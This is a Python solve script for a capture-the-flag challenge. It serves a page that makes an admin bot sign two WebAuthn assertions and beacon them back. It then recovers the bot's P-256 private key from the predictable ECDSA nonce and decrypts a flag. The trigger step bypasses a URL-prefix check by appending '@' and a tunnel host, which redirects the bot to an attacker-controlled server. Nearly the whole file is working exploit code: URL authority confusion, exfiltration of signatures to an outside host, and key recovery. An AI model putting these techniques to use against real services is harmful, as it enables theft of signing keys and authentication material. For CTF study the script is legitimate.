#!/usr/bin/env python3
"""CTF Misdirection: receive two deterministic-ECDSA admin-bot signatures,
recover the P-256 private scalar, decrypt provided AES-256-ECB ciphertext.
No dependencies except cryptography (only used for PKCS7/AES).
Run local server with --listen; send report with --trigger and tunnel host.
"""
import argparse
import base64
import hashlib
import json
import re
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import urlparse
from urllib.request import Request, urlopen

from cryptography.hazmat.primitives.asymmetric.utils import decode_dss_signature
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.padding import PKCS7

N = int('ffffffff00000000ffffffffffffffffbce6faada7179e84f3b9cac2fc632551', 16)
CIPHERTEXT = bytes.fromhex(
    'e2cd291adf58c0735c32090f7eb4963'
    '56965f3f153c572442118ed25d7b540d'
    '02e4bd3198db36ace7c3294437db04ef'
    'be367338f3dcfaf4504e2c67da81e9b32'
)
# Use two different rpIds, so two independent signatures must yield SAME scalar.
RP_IDS = ('example.com', 'example.org')
lock = threading.Lock()
samples = {}


def b64decode(s):
    return base64.urlsafe_b64decode(s + '=' * (-len(s) % 4))


def calculate_private(sample):
    rp = sample['rpId']
    if rp not in RP_IDS:
        raise ValueError('Unexpected rpId')
    entry = sample['signed']
    auth = base64.b64decode(entry['authenticatorData'])
    client = base64.b64decode(entry['clientDataJSON'])
    signature = base64.b64decode(entry['signature'])
    r, s = decode_dss_signature(signature)
    assert 0 < r < N and 0 < s < N
    assert len(auth) >= 37
    assert auth[:32] == hashlib.sha256(rp.encode()).digest(), 'rpIdHash is wrong'
    client_dict = json.loads(client)
    assert client_dict['type'] == 'webauthn.get'
    assert client_dict['origin']
    msg_hash = hashlib.sha256(auth + hashlib.sha256(client).digest()).digest()
    z = int.from_bytes(msg_hash, 'big')
    k = int.from_bytes(hashlib.sha256(rp.encode()).digest(), 'big') % N
    d = ((s*k - z) * pow(r, -1, N)) % N
    return d, {'rpId': rp, 'r': hex(r), 's': hex(s), 'k': hex(k), 'z': hex(z), 'd': hex(d)}


def decrypt(d):
    key = d.to_bytes(32,'big')
    decryptor = Cipher(algorithms.AES(key), modes.ECB()).decryptor()
    pt = decryptor.update(CIPHERTEXT) + decryptor.finalize()
    print('Raw plaintext:', repr(pt), flush=True)
    u = PKCS7(128).unpadder()
    try:
        pt2 = u.update(pt) + u.finalize()
        print('Unpadded plaintext:', repr(pt2), flush=True)
        print('Decoded:', pt2.decode('utf-8', 'replace'), flush=True)
        Path('misdir_flag.txt').write_bytes(pt2)
    except ValueError:
        print('PKCS7 padding invalid: check recovered key/cipher assumptions.',flush=True)


HTML = r'''<!doctype html><html><head><meta charset="utf-8"><title>Webauthn diagnostic</title></head>
<body><input id="username"><button id="register-button">Register</button><button id="login-button">Login</button>
<script>
(async function () {
  function enc(x){return btoa(String.fromCharCode(...x)).replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,'')}
  function beacon(x){try{navigator.sendBeacon('/collect', JSON.stringify(x));}catch(e){}}
  async function send(x){
    beacon(x);
    try{
      const r = await fetch('/collect', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(x),keepalive:true,credentials:'include'});
    }catch(e){}
  }
  window.addEventListener('error', e=>{ try{ beacon({error:'jserr:'+e.message+' '+e.filename}); }catch(_){} });
  beacon({boot:'page-loaded', has: typeof window.forgeAuthentication});
  for (let n=0;n<200;n++) {
    if(typeof window.forgeAuthentication === 'function') break;
    await new Promise(r=>setTimeout(r,25));
  }
  beacon({afterwait:true, has: typeof window.forgeAuthentication});
  try {
    for(const rpId of ['example.com','example.org']) {
      const challenge = enc(crypto.getRandomValues(new Uint8Array(32)));
      const credId = enc(new Uint8Array(32).fill(0x41));
      const raw = await window.forgeAuthentication(rpId, challenge, credId);
      beacon({rpId, signed: raw});
      await send({rpId, signed: raw});
    }
    beacon({done:true});
  } catch(e) { beacon({error: String(e)}); await send({error: String(e)}); }
})();
</script></body></html>'''


class Handler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        print('[http] '+fmt % args, flush=True)
    def do_GET(self):
        body = HTML.encode()
        self.send_response(200)
        self.send_header('Content-Type','text/html; charset=utf-8')
        self.send_header('Content-Length',str(len(body)))
        self.end_headers()
        self.wfile.write(body)
    def do_POST(self):
        self.process_payload()
    def do_PUT(self):
        self.process_payload()
    def process_payload(self):
        if self.path not in ('/collect', '/beacon'):
            self.send_error(404); return
        length = int(self.headers.get('Content-Length','0'))
        if not (0 < length <= 65536):
            self.send_error(400); return
        try:
            obj = json.loads(self.rfile.read(length))
        except Exception as exc:
            print('[PARSE ERROR]',repr(exc),flush=True); self.send_response(400); self.end_headers(); self.wfile.write(b'err'); return
        try:
            if 'done' in obj:
                print('[BEACON done]',flush=True)
            elif 'boot' in obj or 'afterwait' in obj:
                print('[BEACON]',{k:v for k,v in obj.items()},flush=True)
            elif 'rpId' in obj and 'signed' in obj:
                d, info = calculate_private(obj)
                print('[SIGNATURE]',info['rpId'],'private candidate',hex(d),flush=True)
                with lock:
                    samples[info['rpId']] = (d,info,obj)
                    if len(samples) == 2:
                        a,b = (samples[rp][0] for rp in RP_IDS)
                        if a != b:
                            print('[ERROR] Recovered private scalars disagree. Verify nonce signature implementation.',flush=True)
                        else:
                            print('[SUCCESS] ADMIN_PRIVATE_KEY =', f'{a:064x}',flush=True)
                            Path('admin_key.hex').write_text(f'{a:064x}\n')
                            decrypt(a)
            elif 'error' in obj and 'rpId' not in obj:
                print('[BOT ERROR]', obj['error'][:500], flush=True)
            else:
                print('[UNKNOWN PAYLOAD]', json.dumps(obj)[:500], flush=True)
            self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
        except Exception as exc:
            print('[HANDLE ERROR]',repr(exc),flush=True)
            self.send_response(200); self.end_headers(); self.wfile.write(b'ok')


def post_json(url, obj):
    req = Request(url,json.dumps(obj).encode(),headers={'Content-Type':'application/json'},method='POST')
    with urlopen(req,timeout=45) as res:
        return res.status, res.read().decode('utf-8','replace')


def trigger(base, tunnel):
    base=base.rstrip('/')
    tunnel=tunnel.rstrip('/')
    parsed=urlparse(tunnel)
    if parsed.scheme not in ('https','http') or not parsed.hostname:
        raise ValueError('Expected tunnel URL e.g. https://abc.trycloudflare.com')
    report_url=base+'/report'
    print('Report URL:',report_url)
    # Read exactly which FRONTEND_URL prefix is accepted; it may differ from public base.
    try:
        code, body = post_json(report_url, {'url':'invalid-probe'})
        print('Prefix probe:',code,body[:1000])
        msg=json.loads(body).get('message','')
        m=re.search(r'URL must start with (.+)',msg)
        prefix=m.group(1).strip() if m else base
    except Exception as e:
        print('Could not query URL prefix, falling back to base:',repr(e))
        prefix=base
    if '://' not in prefix:
        raise ValueError('Bad frontend prefix '+prefix)
    # Backend replaces the valid prefix with BOT_FRONTEND_URL; suffix @tunnel
    # makes the resulting URL authority's host the attacker-controlled tunnel.
    attack_url=prefix+'@'+parsed.netloc+'/auth'
    print('Candidate submitted URL:',attack_url)
    print('Bot replacement gives BOT_FRONTEND_URL + @'+parsed.netloc+'/auth')
    code,body=post_json(report_url, {'url':attack_url})
    print('Report response:',code,body[:3000])
    print('Watch listener for two SIGNATURE messages; no real account sign-in required.')


def main():
    a=argparse.ArgumentParser(description=__doc__)
    group=a.add_mutually_exclusive_group(required=True)
    group.add_argument('--listen',action='store_true')
    group.add_argument('--trigger',action='store_true')
    group.add_argument('--decrypt-key',help='Already recovered private scalar in hex')
    a.add_argument('--port',type=int,default=8877)
    a.add_argument('--base',help='Remote challenge base, e.g. https://misdir.example.com')
    a.add_argument('--tunnel',help='Cloudflare tunnel URL, e.g. https://abc.trycloudflare.com')
    args=a.parse_args()
    if args.decrypt_key:
        decrypt(int(args.decrypt_key.removeprefix('0x'),16));return
    if args.trigger:
        if not args.base or not args.tunnel: a.error('need --base and --tunnel')
        trigger(args.base,args.tunnel);return
    print(f'Listening on http://0.0.0.0:{args.port}/auth',flush=True)
    ThreadingHTTPServer(('0.0.0.0',args.port), Handler).serve_forever()

if __name__=='__main__': main()
